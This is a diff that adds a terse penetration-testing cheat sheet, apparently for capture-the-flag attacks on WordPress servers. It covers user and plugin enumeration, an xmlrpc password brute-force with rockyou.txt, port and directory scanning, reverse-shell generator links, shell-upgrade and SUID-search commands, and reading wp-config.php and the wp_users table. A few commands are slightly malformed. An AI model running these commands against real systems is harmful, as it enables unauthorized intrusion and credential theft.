@@ -1,0 +1,59 @@
+wpscan --url <link> -v -e ap at --api-token <token>
+wpscan --url <link> -v -e ap at --api-token <token> >> scan.txt
+wpscan --url <link> -v -e vp vt u --api-token <token> >> scan.txt
+wpscan --url <link> -U user,user2 -P rockyou.txt --password-attack xmlrpc
+https://hackertarget.com/wordpress-security-scan/
+searchsploit <ip>
+rustscan -a <ip> -r 0-65535 -- -sCV -Pn >> rust.txt
+rustscan -a <ip> -r 0-65535 --ulimit 5000 -- -sCV -Pn >> rust.txt
+gobuster dir --url <link> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+
+path :
+site/readme.html
+site/wp-content/uploads
+site/wp-content/
+site/wp-json/wp/v2/users
+
+
+https://www.revshells.com/
+https://tex2e.github.io/reverse-shell-generator/index.html
+https://weibell.github.io/reverse-shell-generator/
+https://github.com/sakibulalikhan/dnsg
+
+metasploit:
+id
+shell
+is
+which python
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+python -c 'import pty; pty.spawn("/bin/bash")'
+sudo -l
+cat wp-config.php
+find / type -perm -u=s 2>/dev/null
+/usr/sbin/checker
+ltrace /usr/sbin/checker
+id
+cat /root/root.txt
+find / -name user.txt
+find / -name *.txt
+mysql -u <username> -p
+show database;
+show tables;
+use blog;
+show * from wp_users; 
+
+
+whatweb link -v -a 3 -l
+whatweb link -v -a 3
+wfuzz -c -z file,/usr/share/seclists/discovery/DNS/subdomains-top1million-5000.txt -u "link" -H "host: FUZZ.link" -hw 65
+gobuster dir -u <link> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,cgi,html,zip,bak,old,bak,sql,sh,pdf -t 100 >> gobuster.txt
+dirb <link>
+
+
+
+
+
+
+
+
+
